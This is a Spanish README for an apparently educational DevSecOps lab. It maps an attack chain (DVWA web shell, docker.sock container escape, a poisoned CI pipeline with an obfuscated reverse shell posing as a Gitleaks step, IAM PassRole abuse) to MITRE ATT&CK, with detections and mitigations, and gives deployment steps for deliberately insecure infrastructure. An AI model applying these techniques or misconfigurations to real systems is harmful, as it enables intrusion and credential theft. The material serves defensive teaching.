| Server Software Component: Web Shell | T1505.003 | Webshell PHP subida vía File Upload a directorio accesible por Apache en DVWA | File integrity monitoring (FIM) sobre `/var/www/html/upload/`; hash mismatch alert | M1042 · M1045 |
| Implant Internal Image | T1525 | Contenedor efímero `escape1` (alpine) creado vía API Docker con `Binds: /:/mnt/host` como vector de escape | Docker daemon log: creación de contenedor con `Binds=["/:/mnt/host"]`; Falco rule `container_started_with_host_mount` | M1047 |
| Compromise Infrastructure: CI/CD | T1584 | Token del Act-Runner hardcodeado en manifiesto YAML; secretos de Gitea persistentes en `app.ini` vía `hostPath` | Gitleaks: token detectado en diff del manifiesto; audit de Gitea: uso de token desde IP no esperada | M1047 · M1026 |

#### Privilege Escalation

| Técnica | ID | Materialización en el lab | Detección | Mitigación MITRE |
|---|---|---|---|---|
| Escape to Host | T1611 | `docker.sock` (0777) montado en pod MySQL `privileged: true` → contenedor efímero con `chroot /mnt/host` | Falco: `container_started_with_privileged_and_hostmount`; auditd: `chroot` desde proceso dentro de contenedor | M1048 · M1038 |
| Abuse Elevation Control Mechanism: Container Privileged | T1548 | Pod `act-runner` con `privileged: true` y `hostPath: /var/run/docker.sock` — runner ejecuta como root con acceso total al daemon | Kubernetes audit log: creación de pod con `securityContext.privileged: true`; PSA en modo `enforce` rechazaría el apply | M1048 |
| Abuse Elevation Control Mechanism: IAM PassRole | T1548 | `iam:PassRole` sin restricción de `Resource` → capacidad de asignar cualquier rol de la cuenta a cualquier servicio | CloudTrail: `iam:PassRole` invocado con `Resource: "*"`; IAM Access Analyzer: finding "role publicly assumable" | M1026 · M1018 |
| Valid Accounts / Role Assumption | T1078 | `sts:AssumeRole` exitoso contra `devsecops-unrestricted-role` con `Principal: "*"` en trust policy | CloudTrail: `AssumeRole` desde principal no esperado; AWS Config rule `iam-no-inline-policy-unrestricted-principal` | M1026 |

#### Defense Evasion

| Técnica | ID | Materialización en el lab | Detección | Mitigación MITRE |
|---|---|---|---|---|
| Obfuscated Files or Information | T1027 | Payload de reverse shell codificado en base64 dentro del workflow YAML (`YmFzaCAtYy...`); `nohup ... >/dev/null 2>&1 &` para suprimir salida | Static analysis del YAML: patrón `base64 -d \| sh` en steps de workflow; Semgrep rule sobre pipelines | M1049 · M1038 |
| Masquerading: Match Legitimate Name | T1036 | Job de pipeline nombrado como "Secret Scanning (Gitleaks)" mientras ejecuta una reverse shell como primer step | Revisión de código (CODEOWNERS); diff visual del step completo antes de merge | M1049 |
| Use Alternate Authentication Material | T1550 | Secretos de Gitea (`SECRET_KEY`, `JWT_SECRET`) permiten forjar tokens de sesión sin credenciales de usuario | Anomaly detection sobre sesiones de Gitea: JWTs con firma válida pero sin login previo | M1026 · M1054 |

#### Credential Access

| Técnica | ID | Materialización en el lab | Detección | Mitigación MITRE |
|---|---|---|---|---|
| Unsecured Credentials: Credentials in Files | T1552.001 | `config.inc.php` con `db_password = vulnerables` en texto plano; `app.ini` con `SECRET_KEY` y tokens JWT hardcodeados en ConfigMap | FIM sobre ficheros de configuración de apps; Gitleaks en pre-commit y PR scan | M1027 · M1017 |
| Unsecured Credentials: Credentials in Kubernetes Secrets | T1552.007 | `state.db` (Kine/SQLite) legible desde el host; Secrets K8s almacenados en base64 sin cifrado en reposo | Auditd: acceso a `/var/lib/rancher/k3s/server/db/state.db`; K3s `--secrets-encryption` desactivado → AWS Config finding | M1027 · M1047 |
| Steal Application Access Token | T1528 | Token de registro del Act-Runner (`y2HtdzweXvxJ4g11...`) hardcodeado en el comando de arranque del pod | Audit de Gitea: mismo token usado desde dos IPs distintas simultáneamente | M1026 · M1054 |

#### Discovery

| Técnica | ID | Materialización en el lab | Detección | Mitigación MITRE |
|---|---|---|---|---|
| Network Service Discovery | T1046 | Escaneo de red interna de pods `10.42.0.0/24` vía `fsockopen` en PHP desde reverse shell de DVWA | Network flow logs: burst de conexiones TCP cortas a múltiples IPs desde el pod de DVWA | M1030 · M1042 |
| System Information Discovery | T1082 | `cat /proc/self/status`, `cat /proc/mounts`, `env` para mapear capacidades del contenedor desde DVWA | EDR: acceso a `/proc/self/status` desde proceso `apache2`/`php` — inusual en producción | M1028 |
| Permission Groups Discovery: K8s | T1069.003 | `kubectl auth can-i --list` con `kubeconfig` de `cluster-admin` para mapear privilegios totales del clúster | K8s audit log: `SubjectAccessReview` masivo en corto período desde nuevo `kubectl` client | M1047 · M1026 |
| Cloud Service Discovery | T1526 | `aws iam list-attached-user-policies`, `aws sts get-caller-identity` para mapear superficie de IAM | CloudTrail: ráfaga de `list-*` y `describe-*` desde IP/UA no registrado; GuardDuty finding `IAMUser/AnomalousBehavior` | M1018 |

#### Lateral Movement

| Técnica | ID | Materialización en el lab | Detección | Mitigación MITRE |
|---|---|---|---|---|
| Remote Services: MySQL / Internal Service | T1021 | Conexión a `mysql-service:3306` desde pod DVWA usando credenciales de `config.inc.php` | Network policy alert: conexión MySQL iniciada desde pod de aplicación web (no desde servicio legítimo) | M1035 · M1030 |
| Use of Container API for Lateral Movement | T1610 | Docker Engine API sobre `docker.sock` para crear contenedor efímero con acceso total al host | Falco: `evt.type=connect AND fd.name=/var/run/docker.sock AND proc.name!=dockerd` | M1047 |

#### Collection

| Técnica | ID | Materialización en el lab | Detección | Mitigación MITRE |
|---|---|---|---|---|
| Data from Local System | T1005 | Lectura de `state.db` (Kine) directamente desde filesystem del host tras escape del contenedor MySQL | Auditd: `open` sobre `state.db` desde proceso no esperado (no `k3s`, no `sqlite3` del servicio) | M1057 · M1022 |
| Data from Information Repositories | T1213 | `cat /var/lib/gitea-data/app.ini`, `/var/lib/act-runner-data/.runner` — datos sensibles en `hostPath` del host | FIM sobre rutas de `hostPath` de pods de infra; Falco: acceso a `/var/lib/gitea-data/` desde proceso no-gitea | M1022 |

#### Command and Control

| Técnica | ID | Materialización en el lab | Detección | Mitigación MITRE |
|---|---|---|---|---|
| Non-Standard Port | T1571 | Reverse shells sobre puertos 4477, 5555 y 4488 (Kali) sin cifrar | Network flow: conexión saliente desde pod a IP externa en puerto no-80/443; egress sin restricción lo facilita | M1031 · M1037 |
| Application Layer Protocol: Web Protocols | T1071.001 | Docker Engine API REST sobre HTTP sin autenticación (socket Unix) para C2 interno del escape al host | Auditd: raw HTTP sobre socket Unix desde proceso Python; sin TLS en Docker socket | M1031 |

#### Exfiltration

| Técnica | ID | Materialización en el lab | Detección | Mitigación MITRE |
|---|---|---|---|---|
| Exfiltration to Cloud Storage | T1567.002 | Bucket S3 con `PutObject` público (`Principal: "*"`) — cualquier dato del host puede exfiltrarse sin credenciales | S3 server access logs: `PUT` anónimo desde IP externa; AWS Config: `s3-bucket-public-write-prohibited` | M1057 · M1022 |

---

> **Nota sobre cobertura táctica:** la cadena de ataque del laboratorio cubre **11 de las 14 tácticas de la matriz Enterprise de MITRE ATT&CK** (las excepciones son Impact, Resource Development e Reconnaissance, que quedan fuera del scope por tratarse de un entorno controlado sin targets externos). La cobertura de Lateral Movement real entre contenedores, Privilege Escalation vía IaC y CI/CD como vector de Persistence son fases que la mayoría de labs de portfolio no llegan a materializar — aparecen aquí como resultado de explotación real, no como filas añadidas al mapeo.

---

## Lecciones Aprendidas

**El error real nunca está donde lo esperas.** El primer instinto al diseñar el lab fue poner la vulnerabilidad crítica en la capa más visible: la aplicación web. DVWA es la puerta de entrada, así que parecía natural que fuera el eslabón más débil. Pero la cadena real de ataque demostró lo contrario: el contenedor de DVWA estaba razonablemente aislado y no permitía ninguna escalada directa. El fallo crítico estaba tres capas más adentro, en una decisión aparentemente de detalle — montar el `docker.sock` en el pod de MySQL "para facilitar el desarrollo". Este desfase entre dónde se intuye el riesgo y dónde realmente está es exactamente lo que una auditoría busca. Si el lab lo hubiera diseñado de forma obvia, habría enseñado menos.

**La Docker Engine API sin CLI es un ejercicio de protocolo, no de herramientas.** El momento técnicamente más denso del lab fue el escape del contenedor MySQL al host: sin CLI de Docker disponible en la imagen, sin `curl`, sin herramientas de red convencionales. La solución fue hablar directamente con el daemon a través del socket Unix usando Python con módulo `socket` estándar, construyendo peticiones HTTP a mano. Las decisiones de payload que parecen técnicas menores — `alpine` en lugar de `mysql:5.7`, `NetworkMode: host` para que la reverse shell alcance la red del atacante sin NAT, `Binds` en lugar de `mount --bind` para evitar conflictos de punto de montaje — cada una resolvió un fallo silencioso que de otro modo habría quedado sin diagnóstico. Documentar los fallos intermedios fue tan valioso como documentar el exploit final.

**CI/CD es la capa que más infravaloran los modelos de amenazas tradicionales.** El pipeline de Gitea Actions tenía acceso legítimo a todo: el `kubeconfig` del clúster, las credenciales de cloud, el socket de Docker del host. Comprometer el runner no requirió ningún exploit sofisticado — bastó con añadir una línea en un workflow YAML, obfuscada como un paso de escaneo de seguridad. En entornos reales, esta superficie de ataque rara vez aparece en los threat models porque el pipeline "no es un servidor de producción". Es el vector más infravalorado y, en infraestructuras modernas con despliegue continuo, el más crítico.

---

## Despliegue del Laboratorio

<details>
<summary><strong>Ver instrucciones de despliegue completas</strong></summary>

### Prerequisitos

| Componente | Versión mínima | Notas |
|---|---|---|
| Sistema operativo | Ubuntu 22.04 LTS | Probado también en Debian 12 |
| Docker Engine | 24.x | Necesario para LocalStack y los pods del lab |
| K3s | v1.28+ | Se instala automáticamente con el script de bootstrap |
| Terraform | 1.6+ | Para el aprovisionamiento de IaC sobre LocalStack |
| Ansible | 2.15+ | Para el provisioning del host |
| LocalStack | 3.x | Emulador de AWS local (via `docker-compose`) |
| Kubectl | 1.28+ | Para interactuar con el clúster K3s |
| Python | 3.10+ | Para los scripts de explotación del lab |
| Kali Linux (atacante) | Rolling | IP `192.168.252.20` en la red del lab; `netcat` requerido |

### Red del laboratorio

192.168.252.0/24 → Red host / Kali
192.168.252.10 → Nodo K3s (control-node, donde corre todo)
192.168.252.20 → Kali Linux (atacante)
10.42.0.0/24 → Red interna de pods (K3s flannel)
10.43.0.0/24 → Red de servicios de K3s (ClusterIP)


### Orden de despliegue

**Paso 1 — Clonar el repositorio y preparar el entorno**

```bash
git clone https://github.com/<usuario>/devsecops-lab.git
cd devsecops-lab
```

**Paso 2 — Levantar LocalStack (emulador de AWS)**

```bash
cd 01-cloud-iac
docker-compose up -d

# Verificar que LocalStack está healthy:
curl http://localhost:4566/_localstack/health | jq '.services | .s3, .iam, .ec2, .sts'
# → "available" en los cuatro servicios
```

**Paso 3 — Desplegar infraestructura IaC vulnerable**

```bash
cd 01-cloud-iac/vulnerable
terraform init
terraform apply -auto-approve

# Verificar recursos desplegados:
aws --endpoint-url=http://localhost:4566 iam list-users
aws --endpoint-url=http://localhost:4566 s3 ls
# → dev-user-admin y devsecops-public-data-bucket visibles
```

**Paso 4 — Instalar K3s en el nodo de control**

```bash
curl -sfL https://get.k3s.io | sh -

# Verificar que el clúster está activo:
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
kubectl get nodes
# → control-node   Ready   control-plane   ...
```

**Paso 5 — Aprovisionar el host con Ansible (configuración vulnerable)**

```bash
cd 02-provisioning
ansible-playbook -i inventory.ini site_vulnerable.yml

# Verificar:
ls -la /var/run/docker.sock
# → srw-rw-rw- (0777 confirma la configuración vulnerable)
ufw status
# → Status: inactive
```

**Paso 6 — Desplegar Gitea y Act-Runner en K3s**

```bash
cd 03-k8s-cluster
kubectl apply -f gitea-deployment.yaml
kubectl apply -f act-runner.yaml

# Verificar:
kubectl get pods -n gitea
# → gitea-... Running   act-runner-... Running

# Gitea accesible en:
# http://192.168.252.10:30000
```

**Paso 7 — Desplegar DVWA y MySQL en K3s**

```bash
cd 04-cicd-pipeline/devsecops-demo/k8s/vulnerable
kubectl apply -f mysql-vulnerable.yaml
kubectl apply -f dvwa-vulnerable.yaml

# Verificar:
kubectl get pods -n vulnerable-apps
# → dvwa-... Running   mysql-deployment-... Running

# DVWA accesible en:
# http://192.168.252.10:<nodePort>/
```

**Paso 8 — Configurar Gitea (post-despliegue)**

```bash
# Crear organización y repositorio de prueba en Gitea:
# http://192.168.252.10:30000
# Usuario: admin / Password: (el que se configure en el primer acceso)

# Subir el pipeline de demostración:
cd 04-cicd-pipeline/devsecops-demo
git remote add origin http://192.168.252.10:30000/<org>/devsecops-demo.git
git push -u origin main
```

### Verificación end-to-end

Una vez desplegado, el entorno está listo cuando:

✅ LocalStack healthy en :4566 con S3, IAM, EC2, STS disponibles
✅ K3s con kubectl operativo y nodo en Ready
✅ Pods Running en namespace vulnerable-apps (dvwa, mysql)
✅ Pods Running en namespace gitea (gitea, act-runner)
✅ DVWA accesible vía browser y con nivel de seguridad en "Low"
✅ docker.sock con permisos 0777 en el host
✅ UFW inactivo en el host


### Levantar la versión hardened (para contraste)

```bash
# IaC hardened:
cd 01-cloud-iac/hardened && terraform apply -auto-approve

# Provisioning hardened:
cd 02-provisioning && ansible-playbook -i inventory.ini site_hardened.yml
```

</details>

---

## Referencias Técnicas

Las siguientes fuentes influyeron directamente en decisiones de diseño del lab — no es una lista exhaustiva de "recursos de seguridad", sino las referencias específicas que resolvieron problemas concretos durante la construcción:

- **MITRE ATT&CK Enterprise Matrix** — [attack.mitre.org](https://attack.mitre.org) — vocabulario base para todo el mapeo táctico de la cadena de ataque.
- **UDF Abuse en MySQL** — Técnica documentada originalmente en el módulo `lib_mysqludf_sys` de Rapid7/Metasploit Framework. El repositorio de referencia: [github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql).
- **Docker socket escape** — "Escaping Docker containers using `docker.sock`" — análisis de Rory McCune / NCC Group sobre abuso del Unix socket del daemon sin CLI disponible.
- **Poisoned Pipeline Execution (PPE)** — Aviv Grafi, Argon Security (2021): *"Poisoned Pipeline Execution: Attacking CI/CD without any Access to Source Code"* — el paper que formalizó el concepto usado en la subsección de CI/CD.
- **OIDC Federation para CI/CD** — AWS Documentation: *"Creating OpenID Connect (OIDC) identity providers"* + Gitea Actions documentation sobre `aws-actions/configure-aws-credentials`.
- **K3s Secrets Encryption** — [docs.k3s.io/security/secrets-encryption](https://docs.k3s.io/security/secrets-encryption) — referencia directa para el control sistémico de cifrado en reposo de `state.db`.
- **tfsec / checkov** — [aquasecurity.github.io/tfsec](https://aquasecurity.github.io/tfsec) / [checkov.io](https://checkov.io) — herramientas de IaC scanning usadas en los controles sistémicos del punto 4.

---

## Licencia

MIT License — este proyecto está destinado exclusivamente a fines educativos y de demostración en entornos controlados y aislados.

Usar las técnicas aquí documentadas contra sistemas sin autorización explícita del propietario es ilegal. El autor no asume ninguna responsabilidad por el uso fuera del contexto para el que fue diseñado este laboratorio.

---
